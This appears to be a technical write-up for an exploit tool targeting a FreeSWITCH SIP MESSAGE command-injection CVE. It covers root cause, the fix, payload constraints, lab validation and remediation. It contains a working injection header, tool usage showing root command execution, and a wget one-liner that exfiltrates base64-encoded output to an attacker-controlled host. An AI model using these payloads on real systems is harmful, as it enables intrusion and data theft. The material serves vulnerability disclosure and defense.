# CVE-2026-116779 - FreeSWITCH `api+` SIP MESSAGE to RCE

A technical breakdown of the bug SIP2Shell exploits, the wire mechanics, the
constraints that shape the payload, and the local and live validation.

## TL;DR

`sofia_presence_handle_sip_i_message()` splits the To user of an inbound SIP
`MESSAGE` on the first `+` and uses the left side as the name of a **chat
protocol** with no allow-list. `mod_dptools` registers a chat interface called
`api` whose handler is a thin wrapper over `switch_api_execute()` - the
FreeSWITCH API dispatcher. So an attacker-controlled address line selects OS
command execution:

```
To: <sip:api+system%20id@target>
```

runs `system id` as the FreeSWITCH process and messages the output back.

- CVE: CVE-2026-116779 (GHSA-mg63-h38w-8p9p), CVSS 9.8, CWE-77/78/749.
- Affected: FreeSWITCH < 1.11.3 on the stock `internal`/`external` profiles.
- Fixed: 1.11.3 (commit 7015f6a7), which adds an `enable-chat-api-proto` gate
  that is **off** by default, so patched boxes answer 403.
- Credit: Orn Arnarson / Gunnlaugur (vendor advisory).

## Root cause

Chat in FreeSWITCH is addressed like email - `proto+destination`. The handler
reads the To user, cuts at the first `+`, and treats the left side as a
protocol name:

```c
/* sofia_presence.c */
if ((p = strchr(to_user, '+')) && p != to_user) {
    switch_copy_string(proto, to_user, sizeof(proto));   /* char proto[512] */
    p = strchr(proto, '+');
    *p++ = '\0';
    ...
}
switch_core_chat_send(proto, event);
```

The dispatch table in `mod_dptools` includes `jingle`, `event` and `api`; the
`api` entry is the dangerous one:

```c
/* mod_dptools.c */
static switch_status_t api_chat_send(switch_event_t *message_event)
{
    ...
    switch_url_decode(cmd);
    if ((arg = strchr(cmd, ' '))) *arg++ = '\0';
    SWITCH_STANDARD_STREAM(stream);
    switch_api_execute(cmd, arg, NULL, &stream);
    if (proto)
        switch_core_chat_send_args(proto, "api", to, from, ..., stream.data, ...);
}
```

`switch_api_execute()` is the same dispatcher `fs_cli` and the event socket
run. `system` is a stock API that passes its argument to the shell, so the
whole OS is reachable. `stream.data` carries the output back to the sender -
that is the read-back channel SIP2Shell uses.

The fix adds exactly this, before anything is dispatched:

```c
if (!strcasecmp(proto, "api") && !sofia_test_pflag(profile, PFLAG_ENABLE_CHAT_API_PROTO)) {
    nua_respond(nh, SIP_403_FORBIDDEN, ...);
    return;
}
```

`strcasecmp` because the chat registry is case-insensitive; the parameter is
commented out in the stock profiles.

## Preconditions

- A single inbound `MESSAGE` is accepted. Inbound chat is on in the stock
  profiles; `auth-messages` off, or any valid account, is enough.
- The stock directory ships a `default`-ish path with users `1000`-`1019`,
  password `1234`, which is why many hosts answer 202 with no credentials.
  Profiles that keep MESSAGE auth answer 407 and need credentials.

## Payload constraints

Four things shape the encoded command (all verified on 1.10.x):

1. `+` is hostile. The proto separator is the first literal `+`; any `+`
   inside the command is percent-encoded as `%2B`, and spaces as `%20`
   (`switch_url_decode()` never turns `+` into a space). SIP2Shell quotes the
   whole command with `urllib.parse.quote(safe="")`.
2. `char proto[512]` - the To user is copied into a 512-byte buffer and
   truncated. Keep the encoded command under ~500 bytes.
3. The `api` handler splits `cmd` at the first space, so the API name and its
   argument are separated by a single space: `system <arg>`.
4. Execution is scheduled and the MESSAGE is answered 202 immediately, so a 2xx
   proves nothing by itself. SIP2Shell confirms with output.

## Exfiltration

`api+system <cmd>` returns the command output in a chat `MESSAGE` sent back to
the `from` address. That "read-back" only routes when the sender is resolvable
(registered/known) - on a direct FreeSWITCH with an unknown sender the log
literally says `Nobody to send to`. So SIP2Shell prefers an explicit
out-of-band channel:

```
system wget -q -O- "http://<you>:<port>/<token>/$( ( cmd ) 2>&1 | base64 -w0 )"
```

and falls back across `wget` / `curl` / `busybox`. `base64` keeps arbitrary
output URL-safe. The tool runs a tiny HTTP listener and prints the decoded
output.

## Local validation (real FreeSWITCH, A/B)

Two real builds, no emulation:

```
safarov/freeswitch:1.10.12   -> vulnerable (api MESSAGE -> 202, RCE)
safarov/freeswitch:1.11.3    -> patched    (api MESSAGE -> 403)
```

`lab/run.sh` boots either with host networking, a known SIP password and
MESSAGE auth off. Against 1.10.12:

```
$ python3 sip2shell.py exploit -t <lab> -c "id"
uid=0(root) gid=0(root) groups=0(root)
```

Against 1.11.3:

```
$ python3 sip2shell.py probe -t <lab>
  ---- <lab>:5060   patched v1.11.3
```

## Lab validation

Only ever run this against your own lab or a target you are explicitly
authorized to test. The included Docker lab is the reference validation: a
real `safarov/freeswitch:1.10.12` (vulnerable) and `1.11.3` (patched) pair,
bootstrapped with a known SIP password and MESSAGE auth off.

```bash
cd lab && ./run.sh vuln       # 1.10.12 -> api+ MESSAGE accepted (202)
python3 ../sip2shell.py exploit -t <lab-ip> -c "id; hostname"
# uid=0 gid=0 groups=0
# <container hostname>

cd lab && ./run.sh patched    # 1.11.3 -> 403
python3 ../sip2shell.py probe -t <lab-ip>
# patched v1.11.3
```

For a target you are authorized to test that sits behind NAT, point the
out-of-band channel at a callback you control (see `--oob-url`). The
mechanism is the same; the only difference is reachability.

## Responsible testing notes

- Keep a written scope. "It responded to a MESSAGE" is not authorization.
- Prefer a disposable lab (the included one) for regression and demos.
- If you find a vulnerable host in the wild, do not exploit it: report it to
  the operator or the relevant CERT, and treat the CVE as active.

## Remediation

- Upgrade to FreeSWITCH **1.11.3+** (the gate ships off).
- Or set `enable-chat-api-proto` deliberately and restrict who can reach 5060.
- Keep MESSAGE auth on and remove passwordless directory users.
- Note: `disable_system_api_commands=true` does not fix it - the api proto
  stays reachable and every other API command remains available.

## References

- NVD: CVE-2026-116779
- Advisory: GHSA-mg63-h38w-8p9p
- Fix: signalwire/freeswitch commit 7015f6a7 (PR #3135, 1.11.3)
- Repro thread: signalwire/freeswitch issue #3078
